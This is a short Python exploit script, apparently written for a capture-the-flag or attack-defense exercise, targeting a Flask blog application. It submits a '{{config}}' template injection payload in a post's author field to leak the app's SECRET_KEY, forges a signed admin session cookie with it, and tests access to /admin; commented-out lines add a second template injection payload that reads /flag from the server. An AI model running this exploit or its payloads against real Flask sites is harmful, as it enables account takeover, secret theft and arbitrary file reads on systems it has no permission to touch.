import requests
import re,sys
from flask.sessions import SecureCookieSessionInterface
target = 'http://%s:%s'%(sys.argv[1],sys.argv[2])


secret_key = re.findall('SECRET_KEY&#39;: &#39;(.*?)&#39;',requests.post(target+'/post',data={'title':'a','author':'{{config}}','content':"hello world!"}).text)[0]
print(secret_key)

class App(object):  
    def __init__(self):
        self.secret_key = None
app = App()  
app.secret_key = secret_key

si = SecureCookieSessionInterface()  
serializer = si.get_signing_serializer(app)  
session = serializer.dumps({'admin':True})
print(session)

r = requests.get(target+'/admin', cookies={'session':session}).text
if 'Settings' not in r:
    print('fixed')
    exit(0)
    
# requests.post(target+'/admin', cookies={'session':session}, data={'site_title':"{{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['__builtins__']['open']('/flag').read()}}"})

# print(re.findall(r'flag\{[^}]*?\}',requests.get(target).text))
